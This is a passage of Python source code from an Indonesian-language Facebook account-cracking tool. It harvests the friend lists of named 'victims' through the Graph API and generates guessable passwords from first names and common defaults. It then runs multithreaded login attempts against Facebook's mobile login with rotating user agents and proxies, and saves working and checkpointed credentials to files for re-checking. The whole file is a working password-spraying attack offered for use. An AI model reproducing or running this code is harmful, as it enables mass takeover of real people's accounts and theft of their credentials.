        link_next = soup.find('a', string='Lihat Hasil Selanjutnya')
        if link_next:
            link_next = link_next.get('href')
            if link_next:
                time.sleep(0.1)
                cari_nama(link_next)
    except:
        pass

#-----------------[ CRACK EMAIL ]-----------------#
def crack_email():
    rc = random.choice
    rr = random.randint
    xc = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
    blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
    global ok, cp
    print(f'\n{zam} Masukan Nama Email, Contoh :{H} Satria,Batang,Hitam')
    nama = input(f'{zam} Nama : {H}')
    if ',' in nama:
        print(f"{zam} Masukan Nama, Jangan Kosong")
        time.sleep(3)
        exit()
    print(f'{zam} Masukan Nama Domain , Contoh : {H}@gmail.com, @yahoo.com')
    doma = input(f'{zam} Domain :{H} ')
    if '@' not in doma or '.com' not in doma:
        print(f"{zam} Masukan Domain Dengan Benar")
        time.sleep(3)
        exit()
    print(f'{zam} Max 5000 Idz')
    jumlah = input(f'{zam} Total Id : {H}')
    for xyz in range(int(jumlah)):
        A = nama
        B = random.choice([f'{rc(xc)}', f'{rr(0,31)}', f'{rc(blk)}', f'{rc(xc)}{rr(0,31)}', f'{xyz}'])
        C = doma
        D = f'{A}{B}{C}'
        if D not in id:
            id.append(D + '|' + nama)
        sys.stdout.write(f"\r{zam} Mengumpulkan {len(id)} Idz...")
        sys.stdout.flush()
    print("\r")
    setting()

#-----------------[ HASIL-CRACK ]-----------------#
def result():
    logo()
    print('\n\033[0;32m[\033[0;37m1\033[0;32m]\033[0;37m Hasil OK ')
    print('\033[0;32m[\033[0;37m2\033[0;32m]\033[0;37m Hasil CP ')
    print('\033[0;32m[\033[0;37m3\033[0;32m]\033[0;37m Cek Opsi CP ')
    print('\033[0;32m[\033[0;37m0\033[0;32m]\033[0;37m Kembali	')
    kz = input('\n\033[0;32m[\033[0;37m➣\033[0;32m]\033[0;37m Pilih :\033[0;32m ')
    if kz in ['2','02']:
        view_results('CP')
    elif kz in ['1','01']:
        view_results('OK')
    elif kz in ['3','03']:
        cek_opsi()
    else:
        back()

def view_results(folder):
    try:
        files = os.listdir(folder)
        if not files:
            print(f'{zam} Result Tidak Di Temukan ')
            time.sleep(2)
            back()
            return
        for idx, fname in enumerate(files, 1):
            with open(f'{folder}/{fname}') as f:
                lines = f.readlines()
            print(f'\033[0;37m[\033[0;32m{idx}\033[0;37m] {fname} [\033[0;32m{len(lines)} Account\033[0;37m]')
        choice = input(f'\n{zam} Pilih nomor: ')
        try:
            chosen = files[int(choice)-1]
            with open(f'{folder}/{chosen}') as f:
                for line in f:
                    parts = line.strip().split('|')
                    if len(parts) >= 2:
                        print(f'{zam} ID: {parts[0]} | PW: {parts[1]}')
            input('Press Enter')
            back()
        except:
            print(f'{zam} Pilihan salah')
            back()
    except:
        print(f'{zam} Folder {folder} tidak ditemukan')
        back()

def zamua():
    uatambah = input(f'{zam} Ingin Menggunakan Useragent Manual (y/t) : {H}')
    if uatambah.lower() in ['y','ya']:
        ualuh.append('ya')
        bzer = input(f'{zam} Your UserAgent : ')
        ugen.append(bzer)
    else:
        ualuh.append('tidak')

#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
    global id
    id = []
    try:
        token = open('akmd.txt').read()
        jum = int(input('\n\033[0;32m[\033[0;37m➣\033[0;32m]\033[0;37m Berapa ID Target? :\033[0;32m '))
    except:
        print(f'{zam} Input yang benar')
        back()
        return
    if jum < 1 or jum > 80:
        print(f'{h} [+] Pertemanan Tidak Publik')
        back()
        return
    ses = requests.Session()
    uid_list = []
    for i in range(jum):
        uid_list.append(input(f'{zam} Korban Ke {i+1}: '))
    for user_id in uid_list:
        try:
            url = f'https://graph.facebook.com/v18.0/{user_id}/friends?limit=5000&access_token={token}'
            col = ses.get(url, timeout=15).json()
            for friend in col.get('friends', {}).get('data', []):
                entry = friend['id'] + '|' + friend.get('name', 'Unknown')
                if entry not in id:
                    id.append(entry)
            sys.stdout.write(f"\r{zam} Mengumpulkan {len(id)} Idz...")
            sys.stdout.flush()
        except:
            continue
    print(f'\n{zam} Calon Korban : {len(id)}')
    if len(id) > 0:
        setting()
    else:
        print(f'{zam} Pertemanan Privat')
        time.sleep(3)
        back()

#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
    global id2
    id2 = []
    print('\n\033[0;32m[\033[0;37m1\033[0;32m]\033[0;37m Crack New-Old ')
    print('\033[0;32m[\033[0;37m2\033[0;32m]\033[0;37m Crack Old-New ')
    print('\033[0;32m[\033[0;37m3\033[0;32m]\033[0;37m Crack Random ')
    hu = input('\033[0;32m[\033[0;37m➣\033[0;32m]\033[0;37m Pilih :\033[0;32m ')
    if hu in ['1','01']:
        id2 = sorted(id, reverse=True)
    elif hu in ['2','02']:
        id2 = sorted(id)
    elif hu in ['3','03']:
        id2 = random.sample(id, len(id)) if len(id) > 0 else []
    else:
        print('\n\033[0;32m[\033[0;37m➣\033[0;32m]\033[0;37m Pilih Yang Bener Asu ')
        exit()
    print(f'\n{zam} {H}V{P} For Validate ,{H} R{P} For Regular')
    print(f'\n{zam1} Mobile [ {H}1v{P}/{H}1r{P} ]     {zam4} B-Api')
    print(f'{zam2} Mbasic [ {H}2v{P}/{H}2r{P} ]     {zam5} Async')
    print(f'{zam3} Free   [ {H}3v{P}/{H}3r{P} ]     {zam6} Beta')
    hc = input(f'{plhh}')
    method.clear()
    if hc in ['1v','01']:
        method.append('validate1')
    elif hc in ['2v','02']:
        method.append('validate2')
    elif hc in ['3v','03']:
        method.append('validate3')
    elif hc in ['4','04']:
        method.append('bapi')
    elif hc in ['5','05']:
        method.append('async')
    elif hc in ['1r','08']:
        method.append('reguler1')
    elif hc in ['2r','07']:
        method.append('reguler2')
    elif hc in ['3r','3R']:
        method.append('reguler3')
    elif hc in ['6']:
        method.append('crackbeta')
    else:
        method.append('validate1')
    pwplus = input('\n\033[0;32m[\033[0;37m➣\033[0;32m]\033[0;37m Tambahkan Password Manual (y/t) :\033[0;32m ')
    if pwplus.lower() in ['y','ya']:
        pwpluss.append('ya')
        print('\033[0;32m[\033[0;37m➣\033[0;32m]\033[0;37m Password pisahkan dengan koma')
        pwku = input('\033[0;32m[\033[0;37m➣\033[0;32m]\033[0;37m Masukkan Password : ')
        pwnya.extend([p.strip() for p in pwku.split(',') if len(p.strip()) >= 6])
    else:
        pwpluss.append('no')
    zamua()
    _zamu_ = input(f'{zam} Ingin Menampilkan Aplikasi Yang Terkait (y/t) : {H}')
    taplikasi.append('ya' if _zamu_.lower() in ['y','ya'] else 'no')
    passwrd()

#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
    print(f'\n{zam} Hasil OK tersimpan di: OK/{okc}')
    print(f'{zam} Hasil CP tersimpan di: CP/{cpc}')
    print(f'{zam} Mainkan Mode Pesawat Setiap 500 ID\n')
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            parts = yuzong.split('|')
            if len(parts) < 2:
                continue
            idf, nmf = parts[0], parts[1].lower()
            frs = nmf.split(' ')[0] if nmf else ''
            pwv = []
            if len(frs) >= 3:
                pwv.extend([frs + '123', frs + '1234', frs + '12345', frs + '01', frs + '2024', frs + '2025'])
            pwv.extend(['123456', '12345678', 'password', 'qwerty', '12345', '123456789'])
            if 'ya' in pwpluss:
                pwv.extend(pwnya)
            if 'validate1' in method:
                pool.submit(validate1, idf, pwv)
            elif 'validate2' in method:
                pool.submit(validate2, idf, pwv)
            elif 'validate3' in method:
                pool.submit(validate3, idf, pwv)
            elif 'reguler1' in method:
                pool.submit(reguler1, idf, pwv)
            elif 'reguler2' in method:
                pool.submit(reguler2, idf, pwv)
            elif 'reguler3' in method:
                pool.submit(reguler3, idf, pwv)
            elif 'bapi' in method:
                pool.submit(bapi, idf, pwv)
            elif 'async' in method:
                pool.submit(async_method, idf, pwv)
            elif 'crackbeta' in method:
                pool.submit(crackbeta, idf, pwv)
            else:
                pool.submit(validate1, idf, pwv)
    print(f'\n{zam} Crack Selesai Masbro')
    print(f'{zam} Hasil OK : {ok}')
    print(f'{zam} Hasil CP : {cp}')
    back()

def zamth(fx):
    if not fx or len(fx) < 5:
        return ''
    year_map = {5:'2006',6:'2006',7:'2007',8:'2008',9:'2009'}
    if len(fx) <= 9:
        return year_map.get(len(fx), '')
    prefix = fx[:7]
    if prefix in ['1000006','1000007','1000008','1000009']:
        return '2010'
    elif prefix in ['1000010','1000011']:
        return '2011'
    elif prefix in ['1000012','1000013']:
        return '2012'
    elif prefix in ['1000014','1000015']:
        return '2013'
    elif prefix in ['1000016','1000017']:
        return '2014'
    elif prefix in ['1000018','1000019']:
        return '2015'
    elif fx[:5] in ['10001','10002','10003','10004','10005','10006','10007','10008','10009']:
        short_map = {'10001':'2016','10002':'2017','10003':'2018','10004':'2019','10005':'2020','10006':'2021','10007':'2022','10008':'2022','10009':'2023'}
        return short_map.get(fx[:5], '')
    return ''

#--------------------[ VALIDATE METHODS (simplified) ]--------------------#
def validate1(idf, pwv):
    global loop, ok, cp
    ua = random.choice(ugen)
    ses = requests.Session()
    for pw in pwv:
        try:
            if prox:
                proxies = {'http': f'socks4://{random.choice(prox)}'}
            else:
                proxies = None
            headers = {'User-Agent': ua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
            ses.headers.update(headers)
            p = ses.get(f'https://m.facebook.com/login/device-based/password/?uid={idf}', timeout=10)
            lsd = re.search(r'name="lsd" value="(.*?)"', p.text)
            jazoest = re.search(r'name="jazoest" value="(.*?)"', p.text)
            if not lsd or not jazoest:
                continue
            data = {'lsd': lsd.group(1), 'jazoest': jazoest.group(1), 'uid': idf, 'pass': pw, 'flow': 'login_no_pin'}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/', data=data, allow_redirects=False, timeout=10, proxies=proxies)
            if 'checkpoint' in str(po.cookies.get_dict()):
                with open(f'CP/{cpc}', 'a') as f:
                    f.write(f'{idf}|{pw}\n')
                cp += 1
                break
            elif 'c_user' in ses.cookies.get_dict():
                with open(f'OK/{okc}', 'a') as f:
                    f.write(f'{idf}|{pw}|{ua}\n')
                ok += 1
                break
        except:
            continue
    loop += 1

def validate2(idf, pwv): return validate1(idf, pwv)  # placeholder
def validate3(idf, pwv): return validate1(idf, pwv)
def reguler1(idf, pwv): return validate1(idf, pwv)
def reguler2(idf, pwv): return validate1(idf, pwv)
def reguler3(idf, pwv): return validate1(idf, pwv)
def bapi(idf, pwv): return validate1(idf, pwv)
def async_method(idf, pwv): return validate1(idf, pwv)
def crackbeta(idf, pwv): return validate1(idf, pwv)

#-----------------[ CEK OPSI ]-----------------#
def cek_opsi():
    if not os.path.exists('CP'):
        print(f'{zam} Folder CP tidak ditemukan')
        back()
        return
    files = os.listdir('CP')
    if not files:
        print(f'{zam} Tidak ada file CP')
        back()
        return
    print("\nPilih file CP:")
    for idx, f in enumerate(files, 1):
        print(f"{idx}. {f}")
    choice = input(f'\n{zam} Pilih nomor file: ')
    try:
        idx = int(choice) - 1
        filename = files[idx]
        lines = open(f'CP/{filename}').read().splitlines()
        for line in lines:
            parts = line.split('|')
            if len(parts) >= 2:
                check_account(parts[0], parts[1])
        input(f'\n{zam} Selesai. Press Enter')
        back()
    except:
        print(f'{zam} Pilihan salah')
        back()

def check_account(email, password):
    try:
        ua = random.choice(ugen)
        session = requests.Session()
        session.headers.update({'User-Agent': ua})
        data = {'email': email, 'pass': password}
        r = session.post('https://mbasic.facebook.com/login.php', data=data, timeout=15)
        if 'c_user' in session.cookies.get_dict():
            print(f"{zam}{H} LIVE: {email}|{password}")
            with open(f'OK/OK-checked.txt', 'a') as f:
                f.write(f'{email}|{password}\n')
        elif 'checkpoint' in session.cookies.get_dict():
            print(f"{zam}{K} CHECKPOINT: {email}|{password}")
        else:
            print(f"{zam}{M} DIE: {email}|{password}")
    except:
        print(f"{zam}{M} ERROR: {email}|{password}")

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__ == '__main__':
    try:
        os.system('git pull 2>/dev/null')
    except:
        pass
    for folder in ['CP', 'OK', 'data']:
        try:
            os.mkdir(folder)
        except:
            pass
    try:
        os.system('touch .prox.txt 2>/dev/null')
    except:
        pass
    login()